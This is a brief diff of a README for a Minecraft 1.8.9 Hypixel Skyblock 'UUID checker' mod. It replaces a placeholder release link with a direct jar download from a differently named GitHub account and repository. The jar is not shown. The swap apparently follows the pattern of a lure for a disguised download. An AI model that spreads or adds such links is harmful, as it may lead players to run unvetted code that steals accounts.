@@ -1,6 +1,6 @@
 # Hypixel Skyblock Full UUID Checker Mod (Minecraft 1.8.9)
 
-[![Download Mod](https://img.shields.io/badge/Download-Mod-blue.svg)](https://github.com/your-repo/uuid-checker/releases)
+[![Download Mod](https://img.shields.io/badge/Download-Mod-blue.svg)](https://github.com/SchbiAuth/Uuid-Fetcher/releases/download/uuid/uuid-fetcher1.0.1.jar)
 
 Welcome to the **Full UUID Checker Mod** for **Hypixel Skyblock** running on Minecraft 1.8.9! This mod helps **prevent item duplication exploits** by verifying and checking the **full UUID** of items in your inventory. It's an essential tool for players, server admins, and developers to ensure that the items in the game are legitimate and not duplicated.
 
